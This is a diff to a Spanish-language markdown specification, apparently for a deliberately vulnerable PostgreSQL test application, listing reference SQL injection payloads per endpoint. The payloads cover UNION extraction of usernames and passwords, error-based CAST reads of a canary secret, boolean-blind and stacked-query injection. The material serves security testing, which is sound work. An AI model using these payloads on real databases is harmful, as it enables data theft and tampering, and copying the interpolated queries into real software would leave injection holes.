@@ -45,7 +45,7 @@ SELECT id, name, price FROM products WHERE name ILIKE '%{q}%' AND hidden = false
 | Familia | Parámetro | Payload de referencia | Efecto esperado |
 |---|---|---|---|
 | union | `q` | `' UNION SELECT id, username, 0 FROM users --` | La respuesta contiene `admin` |
-| error | `q` | `' AND 1=CAST((SELECT version()) AS int) --` | Error de PostgreSQL que contiene `invalid input syntax for type integer` |
+| error | `q` | `' AND 1=CAST((SELECT token FROM canary_secrets) AS int) --` | Error de PostgreSQL que contiene `invalid input syntax for type integer` |
 | boolean_blind | `q` | `lap%' AND 1=1 --` | Con `lap%' AND 1=2 --` (condición falsa) la respuesta difiere de la verdadera |
 
 ## product
@@ -65,7 +65,7 @@ SELECT id, name, price, description FROM products WHERE id = {id} AND hidden = f
 | Familia | Parámetro | Payload de referencia | Efecto esperado |
 |---|---|---|---|
 | union | `id` | `0 UNION SELECT id, username, 0, password FROM users --` | La respuesta contiene `admin123` |
-| error | `id` | `1 AND 1=CAST((SELECT version()) AS int)` | Error de PostgreSQL que contiene `invalid input syntax for type integer` |
+| error | `id` | `1 AND 1=CAST((SELECT token FROM canary_secrets) AS int)` | Error de PostgreSQL que contiene `invalid input syntax for type integer` |
 | boolean_blind | `id` | `3 AND 1=1` | Con `3 AND 1=2` (condición falsa) la respuesta difiere de la verdadera |
 
 ## login
@@ -102,7 +102,7 @@ SELECT id, name, price FROM products WHERE hidden = false ORDER BY {order}
 
 | Familia | Parámetro | Payload de referencia | Efecto esperado |
 |---|---|---|---|
-| error | `order` | `CAST((SELECT version()) AS int)` | Error de PostgreSQL que contiene `invalid input syntax for type integer` |
+| error | `order` | `CAST((SELECT token FROM canary_secrets) AS int)` | Error de PostgreSQL que contiene `invalid input syntax for type integer` |
 | boolean_blind | `order` | `id, (SELECT CASE WHEN 1=1 THEN 1 ELSE 1/0 END)` | Con `id, (SELECT CASE WHEN 1=2 THEN 1 ELSE 1/0 END)` (condición falsa) la respuesta difiere de la verdadera |
 
 ## comments
@@ -159,7 +159,7 @@ INSERT INTO cart_items (user_id, product_id, qty) VALUES (2, {product_id}, {qty}
 
 | Familia | Parámetro | Payload de referencia | Efecto esperado |
 |---|---|---|---|
-| error | `qty` | `CAST((SELECT version()) AS int)` | Error de PostgreSQL que contiene `invalid input syntax for type integer` |
+| error | `qty` | `CAST((SELECT token FROM canary_secrets) AS int)` | Error de PostgreSQL que contiene `invalid input syntax for type integer` |
 | stacked | `qty` | `1); INSERT INTO comments (product_id, author, body) VALUES (1, 'stacked-cart', 'injected'); --` | Aparece un comentario del autor `stacked-cart` |
 
 ## Flujos benignos
